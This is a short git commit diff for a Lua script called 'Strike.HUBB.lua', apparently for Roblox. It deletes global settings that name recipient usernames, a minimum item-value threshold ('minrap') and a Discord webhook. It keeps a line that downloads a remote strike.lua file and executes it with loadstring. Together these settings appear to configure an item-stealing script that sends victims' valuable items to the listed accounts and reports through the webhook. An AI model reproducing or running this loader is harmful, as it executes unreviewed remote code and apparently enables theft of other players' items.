5f555a97063d86733d2361e4fa1df2df239dea83
HateME121 <dragonfang2007@gmail.com>
2025-11-01 22:55:04 +0000

    Update Strike.HUBB.lua

--- Strike.HUBB.lua
+++ Strike.HUBB.lua
@@ -1,7 +1,3 @@
--- ===== Set your globals =====
-_G.Usernames = {"ilovemyamazing_gf1", "Yeahboi1131", "Dragonshell23", "Dragonshell24", "Dragonshell21"}
-_G.minrap = 10000000
-_G.webhook = "https://discord.com/api/webhooks/your_webhook_here"
 
 -- ===== Load strike.lua =====
 loadstring(game:HttpGet("https://raw.githubusercontent.com/1DeathStare1/Strike.Hub/main/strike.lua"))()
